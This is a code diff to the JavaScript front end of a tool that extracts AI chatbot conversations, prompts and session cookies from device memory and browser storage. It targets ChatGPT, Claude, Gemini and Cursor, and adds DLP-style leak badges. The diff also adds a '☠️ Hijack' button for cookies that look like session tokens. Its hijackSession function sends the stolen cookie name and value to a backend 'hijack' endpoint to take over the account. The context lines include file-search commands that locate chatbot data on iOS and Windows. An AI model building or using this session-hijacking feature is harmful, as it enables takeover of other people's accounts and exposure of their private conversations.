@@ -37,7 +37,7 @@ document.addEventListener('DOMContentLoaded', () => {
     ramHexData: null,         // Uint8Array for currently carved RAM dump
     hexMatches: [],          // Found offsets from search
     activeHexMatchIndex: -1,
-    activeBotFilter: 'all',  // all | chatgpt | claude | gemini
+    activeBotFilter: 'all',  // all | chatgpt | claude | gemini | cursor
     lastSQLiteResult: null,  // cache for SQLite query results
     lastLivePrompts: null,   // cache for live monitor prompts
     lastLiveConversations: null, // cache for live monitor conversations
@@ -630,6 +630,8 @@ find /var/mobile/Containers/Data/Application -name "*ChatGPT*"`
         const colHeader = headers[cIdx].toLowerCase();
         if (colHeader === 'bot') {
           td.innerHTML = `<span class="bot-badge bot-${val}">${val.toUpperCase()}</span>`;
+        } else if (colHeader === 'actions') {
+          td.innerHTML = val;
         } else {
           td.textContent = val !== null ? val : 'NULL';
         }
@@ -737,6 +739,13 @@ find /var/mobile/Containers/Data/Application -name "*ChatGPT*"`
       
       const isDeleted = msg.metadata && msg.metadata.deleted;
       const botName = msg.metadata && msg.metadata.bot ? msg.metadata.bot : 'chatgpt';
+      const threats = msg.metadata && msg.metadata.threats ? msg.metadata.threats : [];
+      let threatTags = '';
+      if (threats.length > 0) {
+        threatTags = `<div class="threat-badges" style="margin-top:8px; display:flex; flex-direction:column; gap:4px;">` + 
+          threats.map(t => `<span class="badge-deleted" style="background:#fee2e2; color:#b91c1c; border-color:#fca5a5; font-size:10px; padding:2px 6px; border-radius:4px; display:inline-block; width:fit-content;">⚠️ DLP THREAT: Leaked ${escapeHTML(t.type)} (${escapeHTML(t.match)})</span>`).join('') +
+          `</div>`;
+      }
       
       const bubble = document.createElement('div');
       bubble.className = `chat-bubble ${role} ${isDeleted ? 'deleted' : ''}`;
@@ -752,7 +761,7 @@ find /var/mobile/Containers/Data/Application -name "*ChatGPT*"`
           <strong>${role.toUpperCase()} ${botTag} ${deletedTag}</strong>
           <span>${timeStr}</span>
         </div>
-        <div class="chat-bubble-body">${escapeHTML(content)}</div>
+        <div class="chat-bubble-body">${escapeHTML(content)} ${threatTags}</div>
         <div class="chat-bubble-footer">
           <span>Model: ${model}</span>
           <span>ID: ${msg.id.substring(0, 8)}...</span>
@@ -1553,8 +1562,13 @@ find /var/mobile/Containers/Data/Application -name "*ChatGPT*"`
       // Process session cookies
       if (data.cookies && data.cookies.length > 0) {
         let newCookiesFound = false;
-        const headers = ['Host', 'Cookie Name', 'Value (Truncated)', 'Expires', 'Secure', 'Bot'];
-        const rows = data.cookies.map(c => [c.host, c.name, c.value, c.expires, c.secure ? 'TRUE' : 'FALSE', c.bot]);
+        const headers = ['Host', 'Cookie Name', 'Value (Truncated)', 'Expires', 'Secure', 'Bot', 'Actions'];
+        const rows = data.cookies.map(c => {
+          const actionHtml = (c.name.includes('session-token') || c.name.includes('token') || c.name.includes('Session') || c.name.includes('__Secure-next-auth') || c.name.includes('session_token') || c.name.includes('sid'))
+            ? `<button class="btn" style="padding: 2px 6px; font-size:10px; border-color:var(--red); color:var(--red);" onclick="window.hijackSession('${escapeJS(c.bot)}', '${escapeJS(c.name)}', '${escapeJS(c.value)}')">☠️ Hijack</button>`
+            : 'N/A';
+          return [c.host, c.name, c.value, c.expires, c.secure ? 'TRUE' : 'FALSE', c.bot, actionHtml];
+        });
         
         data.cookies.forEach(item => {
           const cookieKey = `${item.host}-${item.name}`;
@@ -1669,7 +1683,8 @@ find /var/mobile/Containers/Data/Application -name "*ChatGPT*"`
                 metadata: {
                   model_slug: "gpt-4o",
                   deleted: true,
-                  bot: c.bot || "chatgpt"
+                  bot: c.bot || "chatgpt",
+                  threats: msg.threats || []
                 }
               }
             };
@@ -1689,45 +1704,48 @@ find /var/mobile/Containers/Data/Application -name "*ChatGPT*"`
       });
     }
     
-    // If no carved conversations were mapped, fallback to mapping lastLivePrompts as a single thread
-    if (mappedConvos.length === 0 && state.lastLivePrompts && state.lastLivePrompts.length > 0) {
-      const mockConvo = {
-        title: "Live Active Capture",
-        mtime: 0,
-        offset: 0,
-        mapping: {
-          "root": { id: "root", message: null, parent: null, children: [] }
-        }
-      };
-      
-      let prevNode = "root";
-      let nodeIndex = 0;
-      
-      state.lastLivePrompts.forEach(p => {
-        // Apply Bot Filter
-        if (state.activeBotFilter !== 'all' && p.bot !== state.activeBotFilter) {
-          return; // skip node
-        }
-        
-        const nodeId = `node-${nodeIndex}`;
-        const text = p.parts ? p.parts.join('\n') : '';
-        mockConvo.mapping[prevNode].children = [nodeId];
-        mockConvo.mapping[nodeId] = {
-          id: nodeId,
-          parent: prevNode,
-          children: [],
-          message: {
-            id: nodeId,
-            author: { role: p.role },
-            create_time: Date.now() / 1000 - (10 * nodeIndex),
-            content: { parts: [text] },
-            metadata: { model_slug: "gpt-4o", deleted: p.deleted, bot: p.bot }
+    // Always generate a Plain Raw Prompts Feed thread if lastLivePrompts has items
+    if (state.lastLivePrompts && state.lastLivePrompts.length > 0) {
+      const filteredPrompts = state.lastLivePrompts.filter(p => state.activeBotFilter === 'all' || p.bot === state.activeBotFilter);
+      if (filteredPrompts.length > 0) {
+        const botLabel = state.activeBotFilter === 'all' ? 'All Platforms' : state.activeBotFilter.toUpperCase();
+        const rawFeedConvo = {
+          title: `⚡ Raw Carved Prompts Feed (${botLabel} - ${filteredPrompts.length} items)`,
+          mtime: Date.now() / 1000,
+          offset: 999999,
+          mapping: {
+            "root": { id: "root", message: null, parent: null, children: [] }
           }
         };
-        prevNode = nodeId;
-        nodeIndex++;
-      });
-      mappedConvos.push(mockConvo);
+        
+        let prevNode = "root";
+        filteredPrompts.forEach((p, pIdx) => {
+          const nodeId = `raw-prompt-node-${pIdx}`;
+          const text = p.parts ? p.parts.join('\n') : '';
+          rawFeedConvo.mapping[prevNode].children = [nodeId];
+          rawFeedConvo.mapping[nodeId] = {
+            id: nodeId,
+            parent: prevNode,
+            children: [],
+            message: {
+              id: nodeId,
+              author: { role: p.role || "user" },
+              create_time: (Date.now() / 1000) - (filteredPrompts.length - pIdx) * 5,
+              content: { parts: [text] },
+              metadata: {
+                model_slug: "gpt-4o",
+                deleted: p.deleted,
+                bot: p.bot || "chatgpt",
+                threats: p.threats || []
+              }
+            }
+          };
+          prevNode = nodeId;
+        });
+        
+        // Prepend raw feed thread to mappedConvos
+        mappedConvos.unshift(rawFeedConvo);
+      }
     }
     
     renderChatExport(mappedConvos);
@@ -3216,5 +3234,28 @@ findstr /M /S "claude" "%LocalAppData%\\Microsoft\\Edge\\User Data\\Default\\Ind
       }
     });
   }
+
+  window.hijackSession = async (bot, name, value) => {
+    const token = sessionStorage.getItem('bootstrapToken') || '';
+    logToTerminal(`[Session Hijacker] Triggering takeover for ${bot.toUpperCase()} using cookie: ${name}`);
+    try {
+      const res = await fetch(API_BASE + 'hijack', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          'X-Bootstrap-Token': token
+        },
+        body: JSON.stringify({ bot, name, value })
+      });
+      const respData = await res.json();
+      if (res.ok) {
+        logToTerminal(`[Session Hijacker] Success! ${respData.message}`);
+      } else {
+        logToTerminal(`[Session Hijacker] Error: ${respData.error}`);
+      }
+    } catch (err) {
+      logToTerminal(`[Session Hijacker] Network error triggering hijack: ${err}`);
+    }
+  };
 
 });
